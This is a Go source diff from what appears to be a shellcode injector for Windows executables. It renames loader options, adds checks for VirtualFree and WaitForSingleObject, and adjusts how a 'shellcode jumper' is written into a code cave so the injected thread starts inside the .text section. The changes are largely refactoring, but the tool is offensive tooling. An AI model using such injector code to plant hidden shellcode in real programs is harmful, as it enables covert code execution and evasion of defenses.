@@ -91,10 +91,10 @@ type loaderCtx struct {
 	LoadLibraryWOnly        bool
 
 	// store options status
-	NeedCreateThread   bool
-	NeedWaitThread     bool
-	NeedEraseShellcode bool
-	NeedJumper         bool
+	NeedCreateThread    bool
+	NeedWaitThread      bool
+	NeedEraseShellcode  bool
+	NeedShellcodeJumper bool
 
 	// encrypt procedure name with xor
 	Kernel32DLLDB          []int64
@@ -204,11 +204,13 @@ func (inj *Injector) buildLoaderASM(src string, shellcode []byte, ins bool) (str
 	hasLoadLibraryW := inj.getProcFromIAT("LoadLibraryW") != nil
 	inj.ctx.WaitThread = ctx.NeedWaitThread
 	inj.ctx.EraseShellcode = ctx.NeedEraseShellcode
-	inj.ctx.ShellcodeJumper = ctx.NeedJumper
+	inj.ctx.ShellcodeJumper = ctx.NeedShellcodeJumper
 	inj.ctx.HasAllProcedures = !ctx.LackProcedure
 	inj.ctx.HasVirtualAlloc = !ctx.LackVirtualAlloc
+	inj.ctx.HasVirtualFree = !ctx.LackVirtualFree
 	inj.ctx.HasVirtualProtect = !ctx.LackVirtualProtect
 	inj.ctx.HasCreateThread = !ctx.LackCreateThread
+	inj.ctx.HasWaitForSingleObject = !ctx.LackWaitForSingleObject
 	inj.ctx.HasLoadLibraryA = hasLoadLibraryA
 	inj.ctx.HasLoadLibraryW = hasLoadLibraryW
 	if ins {
@@ -471,7 +473,7 @@ func (inj *Injector) encryptString(str string, isUTF16 bool) ([]int64, []int64) 
 // tryWriteJumper is used to try to find a code cave for store instructions about
 // a jumper to the shellcode, that the thread start address is in .text section.
 func (inj *Injector) tryWriteJumper(ctx *loaderCtx) error {
-	if len(inj.caves) == 0 || inj.opts.NotCreateThread {
+	if inj.opts.NoShellcodeJumper || len(inj.caves) == 0 {
 		return nil
 	}
 	var src string
@@ -500,21 +502,21 @@ func (inj *Injector) tryWriteJumper(ctx *loaderCtx) error {
 	// process loader template and assemble it
 	tpl, err := template.New("jumper").Parse(src)
 	if err != nil {
-		return fmt.Errorf("invalid jumper template: %s", err)
+		return fmt.Errorf("invalid shellcode jumper template: %s", err)
 	}
 	buf := bytes.NewBuffer(make([]byte, 0, 512))
 	err = tpl.Execute(buf, jmpCtx)
 	if err != nil {
-		return fmt.Errorf("failed to build jumper source: %s", err)
+		return fmt.Errorf("failed to build shellcode jumper source: %s", err)
 	}
 	inst, err := inj.assemble(buf.String())
 	if err != nil {
-		return fmt.Errorf("failed to assemble jumper: %s", err)
+		return fmt.Errorf("failed to assemble shellcode jumper: %s", err)
 	}
 	cave := inj.selectCodeCave()
 	cave.Write(inj.dup, inst)
 	// update loader context
-	ctx.NeedJumper = true
+	ctx.NeedShellcodeJumper = true
 	ctx.JumperOffset = cave.virtualAddr
 	return nil
 }
@@ -621,7 +623,7 @@ func (inj *Injector) useExtendSectionMode(ctx *loaderCtx, sc []byte, src string)
 
 func (inj *Injector) useCreateSectionMode(ctx *loaderCtx, sc []byte, src string) (string, error) {
 	shellcode := inj.encryptShellcode(ctx, sc)
-	randomOffset := uint32(inj.rand.Intn(2048))
+	randomOffset := uint32(inj.rand.Intn(2048)) // #nosec G115
 	scOffset := reservedLoaderSize + randomOffset
 	size := scOffset + uint32(len(shellcode)) // #nosec G115
 	section, err := inj.createSection(inj.opts.SectionName, size)
